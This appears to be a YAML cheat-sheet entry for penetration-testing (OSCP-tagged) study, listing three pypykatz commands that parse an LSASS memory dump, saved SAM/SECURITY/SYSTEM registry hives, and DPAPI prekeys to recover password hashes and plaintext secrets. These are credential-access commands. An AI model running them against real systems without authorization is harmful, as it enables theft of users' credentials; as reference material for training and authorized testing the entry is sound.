---
variants:
  - label: minidump
    command: |
      pypykatz lsa minidump lsass.DMP
  - label: registry-hives
    command: |
      pypykatz registry --sam SAM.save --security SECURITY.save SYSTEM.save
  - label: dpapi-prekey
    command: |
      pypykatz dpapi prekey lsa lsass.DMP
description: Parse an LSASS dump or saved registry hives offline to recover hashes and plaintext secrets
os: [Linux]
category: [oscp, cli]
phase: [CredAccess]
references:
  - https://github.com/skelsec/pypykatz
---
